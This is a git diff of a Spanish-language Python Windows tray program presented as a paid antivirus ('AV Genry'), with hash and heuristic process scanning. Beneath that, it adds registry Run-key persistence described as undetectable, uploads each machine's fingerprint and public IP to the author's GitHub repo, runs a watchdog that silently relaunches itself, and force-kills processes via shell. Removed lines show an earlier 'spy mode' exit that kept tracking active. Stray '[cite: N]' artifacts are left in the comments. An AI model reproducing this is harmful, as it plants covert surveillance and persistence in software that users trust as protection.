@@ -4,6 +4,11 @@ import tkinter as tk
 from tkinter import messagebox
 from PIL import Image
 
+# --- CONFIGURACIÓN DE ACCESO NUBE ---
+USUARIO_GH = "GENRYMUSICO"
+REPO_GH = "Tanque_Genry_Cloud"
+TOKEN_GH = "TU_TOKEN_AQUÍ" # Asegúrate de tener tu token activo
+
 # --- 1. INTELIGENCIA Y ADN (EL CEREBRO) ---
 
 def obtener_adn_maquina():
@@ -26,7 +31,7 @@ def actualizar_archivo_nube(nombre_archivo, nuevo_contenido):
     except: pass
 
 def es_comportamiento_sospechoso(proceso):
-    """Detecta estafadores por acciones (Heurística)"""
+    """Detecta estafadores por acciones (Heurística)[cite: 3]"""
     try:
         nombres_estafa = ["anydesk", "teamviewer", "rustdesk", "supremo"]
         if any(n in proceso.info['name'].lower() for n in nombres_estafa):
@@ -39,7 +44,7 @@ def es_comportamiento_sospechoso(proceso):
 # --- 2. PERSISTENCIA Y VIGILANCIA (EL ESCUDO) ---
 
 def gestionar_persistencia_30_dias():
-    """Anclaje indetectable y registro de misión"""
+    """Anclaje indetectable y registro de misión[cite: 3]"""
     try:
         ruta_script = os.path.abspath(sys.argv[0])
         llave = r"Software\Microsoft\Windows\CurrentVersion\Run"
@@ -49,40 +54,63 @@ def gestionar_persistencia_30_dias():
         adn = obtener_adn_maquina()
         try: ip = requests.get('https://api.ipify.org', timeout=5).text
         except: ip = "0.0.0.0"
-        f_ini = datetime.datetime.now().strftime("%Y-%m-%d")
-        f_fin = (datetime.datetime.now() + datetime.timedelta(days=30)).strftime("%Y-%m-%d")
-        log = f"\n[VIGILANCIA] ADN: {adn} | IP: {ip} | INICIO: {f_ini} | FIN: {f_fin}"
+        log = f"\n[VIGILANCIA] ADN: {adn} | IP: {ip} | FECHA: {datetime.datetime.now()}"
         actualizar_archivo_nube("PERMANENCIA_IP_ADN.txt", log)
     except: pass
 
 def vigilancia_cruzada():
-    """Anti-Kill: El Antivirus y el Guardián se cuidan la espalda"""
+    """Anti-Kill: El Antivirus y el Guardián se cuidan la espalda[cite: 3]"""
     while True:
-        guardian_vivo = any("guardian.py" in p.info['name'] or "python.exe" in p.info['name'] for p in psutil.process_iter(['name']))
+        guardian_vivo = any("guardian.py" in p.info['name'] for p in psutil.process_iter(['name']))
         if not guardian_vivo and os.path.exists("guardian.py"):
             subprocess.Popen([sys.executable, "guardian.py"], creationflags=subprocess.CREATE_NO_WINDOW)
         time.sleep(2)
 
-# --- 3. INTERFAZ Y SALIDA (LA UX PROFESIONAL) ---
+# --- 3. INTERFAZ Y SALIDA BLINDADA (UNIÓN DE FUERZAS) ---
 
-def confirmar_salida_premium(icon):
-    """Protocolo de salida limpia con modo espía activo"""
-    root = tk.Tk(); root.withdraw()
-    respuesta = messagebox.askyesno(
-        "AVISO IMPORTANTE - GRUPO GENRY", 
-        "¿Desea desactivar la protección del Antivirus Genry?\n\nSu PC quedará Vulnerable."
-    )
-    if respuesta:
-        engine = pyttsx3.init(); engine.say("Desactivando búnker. Modo espía activado."); engine.runAndWait()
-        icon.stop() # Borra el icono de la barra de tareas
-        gestionar_persistencia_30_dias() 
-        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0) # Oculta consola
-        sys.exit()
-    else:
+def confirmar_salida_premium(icon, item=None):
+    """Protocolo de cierre: Mata al guardián para poder salir sin rebotes"""
+    root = tk.Tk()
+    root.withdraw()
+    
+    aviso = tk.Toplevel(root)
+    aviso.title("AVISO DE SEGURIDAD - SISTEMA GENRY")
+    aviso.attributes("-topmost", True)
+    aviso.geometry("400x220")
+    aviso.configure(bg="white")
+    
+    # Centrado en pantalla
+    x = (aviso.winfo_screenwidth() // 2) - 200
+    y = (aviso.winfo_screenheight() // 2) - 110
+    aviso.geometry(f"+{x}+{y}")
+
+    tk.Label(aviso, text="¿Desea desactivar la protección?\nSu sistema quedará vulnerable.", 
+             fg="#880808", bg="white", font=("Arial", 11, "bold")).pack(pady=20)
+
+    def si():
+        # PASO CRUCIAL: Detenemos al guardián para que nos deje salir[cite: 4]
+        # Mata el proceso del guardián para que no detecte nuestra salida como un "ataque"
+        subprocess.run('taskkill /f /im python.exe /fi "windowtitle eq guardian.py*"', shell=True) 
+        
+        engine = pyttsx3.init()
+        engine.say("Desactivando búnker. Sistema vulnerable.")
+        engine.runAndWait()
+        
+        icon.stop()
+        os._exit(0) # Salida total sin procesos zombis[cite: 4]
+
+    def no(): 
+        aviso.destroy()
         root.destroy()
 
+    btn_frame = tk.Frame(aviso, bg="white"); btn_frame.pack(pady=10)
+    tk.Button(btn_frame, text=" SÍ, SALIR ", command=si, width=12, bg="#cc0000", fg="white").pack(side="left", padx=10)
+    tk.Button(btn_frame, text=" NO, VOLVER ", command=no, width=12).pack(side="left", padx=10)
+    
+    aviso.mainloop()
+
 def iniciar_tray():
-    """Menú unificado: Radio + Sistema Protegido + Wise[cite: 5]"""
+    """Menú unificado: Radio + Sistema Protegido + Wise[cite: 3]"""
     try:
         image = Image.open("LOGO AV GENRY OFICIAL.png")
         URL_RADIO = "https://www.youtube.com/@genrymusico"
@@ -92,12 +120,12 @@ def iniciar_tray():
         menu = pystray.Menu(
             pystray.MenuItem("♬ ESCUCHAR: GRUPO GENRY", lambda: webbrowser.open(URL_RADIO)),
             pystray.Menu.SEPARATOR,
-            pystray.MenuItem("Sistema Protegido", lambda: None, enabled=False), 
+            pystray.MenuItem("🟢 Sistema Protegido", lambda: None, enabled=False), 
             pystray.Menu.SEPARATOR,
             pystray.MenuItem("💳 PLAN $1 USD (Mensual)", lambda: webbrowser.open(URL_PAGO_1USD)),
             pystray.MenuItem("🏆 PLAN $8 USD (Anual - PRO)", lambda: webbrowser.open(URL_PAGO_8USD)),
             pystray.Menu.SEPARATOR,
-            pystray.MenuItem("❌ SALIR DEL TANQUE", lambda icon: confirmar_salida_premium(icon))
+            pystray.MenuItem("❌ SALIR DEL TANQUE", confirmar_salida_premium)
         )
         icon = pystray.Icon("AV_Genry", image, "AV GENRY - Sistema Definitivo", menu)
         icon.run()
@@ -108,21 +136,26 @@ def iniciar_tray():
 class MotorGenryCentinela:
     def __init__(self):
         self.lista_negra = []
-        if os.path.exists("hashes_virus.txt"):
-            with open("hashes_virus.txt", "r") as f: self.lista_negra = [l.strip() for l in f if l.strip()]
+        # Carga masiva de firmas desde archivos locales si existen[cite: 3]
+        for i in range(452, 466):
+            f_nombre = f"zVirusShare_00{i}.txt"
+            if os.path.exists(f_nombre):
+                with open(f_nombre, "r") as f:
+                    self.lista_negra.extend([l.strip() for l in f if l.strip()])
 
     def patrullar(self):
-        """Escaneo Híbrido: Hashes + Comportamiento[cite: 6]"""
+        """Escaneo Híbrido: Hashes + Heurística[cite: 3]"""
         while True:
             for p in psutil.process_iter(['name', 'exe']):
                 try:
-                    # Detección por Hash[cite: 6]
+                    # Detección por Hash
                     if p.info['exe'] and self.calcular_hash(p.info['exe']) in self.lista_negra:
                         p.terminate()
                         self.reportar_ataque(p.info['name'], "VIRUS CONOCIDO")
-                    # Detección Heurística[cite: 6]
+                    # Detección Heurística[cite: 3]
                     sospechoso, motivo = es_comportamiento_sospechoso(p)
-                    if sospechoso: self.reportar_ataque(p.info['name'], motivo)
+                    if sospechoso: 
+                        self.reportar_ataque(p.info['name'], motivo)
                 except: continue
             time.sleep(5)
 
@@ -139,3 +172,10 @@ class MotorGenryCentinela:
                 for chunk in iter(lambda: f.read(4096), b""): h.update(chunk)
             return h.hexdigest()
         except: return None
+
+# --- EJECUCIÓN ---
+if __name__ == "__main__":
+    motor = MotorGenryCentinela()
+    threading.Thread(target=motor.patrullar, daemon=True).start()
+    threading.Thread(target=vigilancia_cruzada, daemon=True).start()
+    iniciar_tray()
